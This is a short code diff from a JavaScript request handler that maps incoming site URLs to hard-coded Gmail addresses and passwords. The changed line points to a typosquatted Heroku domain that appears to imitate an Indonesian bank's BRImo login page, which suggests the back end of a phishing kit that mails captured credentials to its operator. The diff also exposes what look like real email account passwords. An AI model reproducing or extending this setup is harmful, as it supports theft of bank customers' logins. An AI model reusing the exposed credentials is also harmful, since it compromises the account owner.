@@ -32,7 +32,7 @@ export default function handler(req, res) {
         pass = 'hpwgbnwdgdpryjpa';
         
     }
-    else if (url == 'log-brimo-ib-bifastt.herokuapp.com'){
+    else if (url == 'login-brlmo-ib-bifast.herokuapp.com'){
         email = 'ayamperu2019@gmail.com';
         pass = 'ufseytnucdzgmbah';
         
